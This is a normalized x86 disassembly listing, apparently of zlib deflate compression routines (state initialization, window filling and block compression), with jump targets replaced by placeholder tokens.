mov ecx 0x5ae
[ edi ] [ esi ]
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
push 0x2
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x24 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
push ecx
mov edx [ ebp + 0x8 ]
call [ edx + 0x20 ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x30 ] eax
push 0x2
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x24 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x38 ] eax
push 0x2
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x44 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x3c ] eax
push 0x4
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x1694 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] edx
mov eax [ ebp - 0xc ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_406ee5
add esp 0x4
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx + 0x38 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
cmp [ edx + 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x24 ]
shl eax 0x1
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x30 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x30 ]
push ecx
call sub_40cb30
add esp 0xc
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x24 ]
shl eax 0x1
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x38 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x38 ]
push ecx
call sub_40cb30
add esp 0xc
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x44 ]
shl eax 0x1
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x3c ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x3c ]
push ecx
call sub_40cb30
add esp 0xc
mov edx [ ebp - 0xc ]
mov eax [ edx + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
push ecx
call sub_40cb30
add esp 0xc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + 0x10 ]
sub ecx [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x8 ]
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x10 ] eax
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x1694 ]
shr eax 0x1
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + eax * 2 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x169c ] edx
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x1694 ]
imul edx edx 0x3
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
add ecx edx
mov edx [ ebp - 0xc ]
mov [ edx + 0x1690 ] ecx
mov eax [ ebp - 0xc ]
add eax 0x8c
mov ecx [ ebp - 0xc ]
mov [ ecx + 0xb10 ] eax
mov edx [ ebp - 0xc ]
add edx 0x980
mov eax [ ebp - 0xc ]
mov [ eax + 0xb1c ] edx
mov ecx [ ebp - 0xc ]
add ecx 0xa74
mov edx [ ebp - 0xc ]
mov [ edx + 0xb28 ] ecx
xor eax eax
sub_407242
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
shl ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x34 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x3c ]
mov [ eax + ecx * 2 - 0x2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
lea eax [ edx + edx - 0x2 ]
push eax
push 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
push edx
call sub_40ce70
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
xor edx edx
mov dx [ ecx + r--data ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x78 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x7c ]
imul edx edx 0xc
xor eax eax
mov ax [ edx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x84 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x7c ]
imul eax eax 0xc
xor ecx ecx
mov cx [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x88 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x7c ]
imul ecx ecx 0xc
xor edx edx
mov dx [ ecx + r--data ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x74 ] edx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x64 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x54 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x70 ] 0x2
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x2
mov eax [ ebp + 0x8 ]
mov [ eax + 0x60 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x40 ] 0x0
pop ebp
retn
sub_407330
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] 0xffff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
sub ecx 0x5
cmp [ ebp - 0x4 ] ecx
jbe r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x1
ja r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
sub eax 0x5
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x6c ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_407570
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
sub ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x64 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
cmp edx [ ebp - 0x8 ]
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
sub ecx 0x106
cmp edx ecx
jb r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_409232
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ edx + 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_406e20
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x54 ] 0x0
jl r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp + 0x8 ]
add edx [ eax + 0x54 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_409232
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ edx + 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_406e20
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
neg eax
sbb eax eax
and al 0xfe
add eax 0x3
xor eax eax
cmp [ ebp + 0xc ] 0x4
setne al
dec eax
and eax 0x2
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0xc ] 0x4
sete cl
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x54 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_409232
add esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ecx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_406e20
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
sub_407570
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x64 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx - 0x106 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x64 ] ecx
jb r-xdata
mov eax [ ebp - 0xc ]
sub eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
add edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
push ecx
call sub_40cb30
add esp 0xc
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x68 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x68 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x64 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x54 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x54 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov eax [ ebp - 0x14 ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x64 ]
mov eax [ ebp + 0x8 ]
add ecx [ eax + 0x6c ]
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_4077ab
add esp 0xc
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x3
jb r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x106
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
xor eax eax
mov al [ edx + ecx ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x40 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x1 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
sub edx 0x2
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x4 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp - 0x14 ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x8 ]
mov dx [ ebp - 0x18 ]
mov [ ecx ] dx
mov eax [ ebp - 0x14 ]
sub eax 0x1
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0x4 ]
mov [ ebp - 0x1c ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x34 ]
sub ecx [ eax + 0x6c ]
mov edx [ ebp + 0x8 ]
sub ecx [ edx + 0x64 ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x2
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov dx [ ecx ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
jb r-xdata
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x8 ]
mov ax [ ebp - 0x1c ]
mov [ edx ] ax
mov ecx [ ebp - 0x14 ]
sub ecx 0x1
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub_4077ab
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x10 ]
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_40cb30
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
push ecx
call sub_408820
add esp 0xc
mov edx [ ebp + 0x8 ]
mov [ edx + 0x30 ] eax
mov esp ebp
pop ebp
retn
sub_407843
push ebp
mov ebp esp
sub esp 0x20
push ebx
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x3
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_407570
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x6c ] 0x106
jae r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x58 ] 0x3
jb r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
sub edx 0x106
cmp eax edx
ja r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov dl [ edx + ecx ]
mov [ ebp - 0x14 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov [ eax + ecx * 2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1690 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov al [ ebp - 0x14 ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1698 ] edx
mov ecx [ ebp - 0x14 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x8c ]
add ax 0x1
mov ecx [ ebp - 0x14 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x6c ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x64 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
sub ecx 0x3
mov [ ebp - 0x10 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x68 ]
mov [ ebp - 0xc ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x169c ]
mov cx [ ebp - 0xc ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1690 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
mov cl [ ebp - 0x10 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1698 ] eax
mov dx [ ebp - 0xc ]
sub dx 0x1
mov [ ebp - 0xc ] dx
mov eax [ ebp - 0x10 ]
and eax 0xff
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x490 ]
add ax 0x1
mov ecx [ ebp - 0x10 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + edx * 4 + 0x490 ] ax
mov edx [ ebp - 0xc ]
and edx 0xffff
cmp edx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x80 ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x54 ] 0x0
jl r-xdata
mov edx [ ebp - 0xc ]
and edx 0xffff
sar edx 0x7
xor eax eax
mov al [ edx + r--data ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_407d9a
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] eax
mov [ ebp - 0x20 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x106
jae r-xdata
mov [ ebp - 0x1c ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x54 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x58 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x64 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
xor ecx ecx
mov cl [ eax + edx ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x40 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
mov ecx [ ecx + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x1 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x6c ] 0x3
jb r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x980 ]
add ax 0x1
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x980 ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x6c ]
sub eax [ edx + 0x58 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x6c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x58 ]
cmp ecx [ eax + 0x78 ]
ja r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
neg eax
sbb eax eax
and al 0xfe
add eax 0x3
xor eax eax
cmp [ ebp + 0xc ] 0x4
setne al
dec eax
and eax 0x2
jmp r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x4
sete al
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
sub eax [ edx + 0x54 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_409232
add esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov [ eax + 0x54 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
call sub_406e20
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x54 ]
push ecx
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_409232
add esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ecx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_406e20
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
